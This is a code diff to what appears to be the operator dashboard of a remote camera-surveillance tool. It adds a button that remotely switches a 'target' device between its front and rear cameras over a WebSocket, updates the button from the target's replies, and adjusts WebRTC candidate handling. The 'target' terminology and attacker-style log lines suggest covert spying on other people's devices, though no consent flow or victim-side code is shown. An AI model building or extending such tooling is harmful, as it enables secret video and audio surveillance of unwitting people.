@@ -469,6 +469,7 @@
                 <div class="target-card-footer">
                     <span id="time-${targetId}">Connected just now</span>
                     <div style="display: flex; gap: 8px; flex-wrap: wrap;">
+                        <button class="btn-action" id="camBtn-${targetId}" onclick="switchCamera('${targetId}')">📷 Cam: Front (Switch)</button>
                         <button class="btn-action" onclick="requestTargetOffer('${targetId}')">Reconnect</button>
                         <button class="btn-action" id="zoomBtn-${targetId}" onclick="toggleZoom('${targetId}')">Zoom: Out</button>
                         <button class="btn-action" id="muteBtn-${targetId}" onclick="toggleMute('${targetId}')">Unmute Audio</button>
@@ -491,11 +492,27 @@
                 cardEl: card,
                 videoEl,
                 loaderEl,
-                badgeEl
+                badgeEl,
+                activeCamera: 'user'
             };
             targets.set(targetId, session);
             updateTargetCount();
             return session;
+        }
+
+        function switchCamera(targetId) {
+            const session = targets.get(targetId);
+            const nextCam = (session && session.activeCamera === 'environment') ? 'user' : 'environment';
+            const btn = document.getElementById(`camBtn-${targetId}`);
+            if (btn) btn.innerText = "📷 Switching...";
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                console.log(`[*] Sending switch_camera to target ${targetId}: ${nextCam}`);
+                ws.send(JSON.stringify({
+                    targetId,
+                    type: "switch_camera",
+                    camera: nextCam
+                }));
+            }
         }
 
         function requestTargetOffer(targetId) {
@@ -561,6 +578,13 @@
                     } else if (msg.type === "target_left") {
                         console.log("[-] Target left:", msg.targetId);
                         removeTargetSession(msg.targetId);
+                    } else if (msg.type === "camera_info" && msg.targetId) {
+                        const session = ensureTargetSession(msg.targetId);
+                        session.activeCamera = msg.camera;
+                        const btn = document.getElementById(`camBtn-${msg.targetId}`);
+                        if (btn) {
+                            btn.innerText = msg.camera === 'environment' ? "📷 Cam: Rear (Switch)" : "📷 Cam: Front (Switch)";
+                        }
                     } else if (msg.type === "offer" && msg.targetId) {
                         console.log("[+] Received offer from target:", msg.targetId);
                         await handleTargetOffer(msg.targetId, msg.data);
@@ -568,7 +592,7 @@
                         const session = ensureTargetSession(msg.targetId);
                         if (session.pc && session.pc.remoteDescription && session.pc.remoteDescription.type) {
                             try {
-                                await session.pc.addIceCandidate(new RTCIceCandidate(msg.data));
+                                await session.pc.addIceCandidate(msg.data);
                             } catch (e) {
                                 console.warn("Failed to add ICE candidate:", e);
                             }
